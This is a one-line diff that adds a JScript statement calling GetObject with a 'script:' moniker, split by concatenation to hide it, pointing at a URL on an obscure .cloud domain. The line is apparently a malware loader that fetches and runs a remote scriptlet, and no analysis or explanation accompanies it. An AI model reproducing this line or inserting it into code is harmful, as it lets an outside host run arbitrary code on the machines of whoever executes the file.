@@ -1,0 +1,1 @@
+var a = 'script:';GetObject(a+'HTtp://60ooms.wwfcpfxfcy.cloud/?1/')
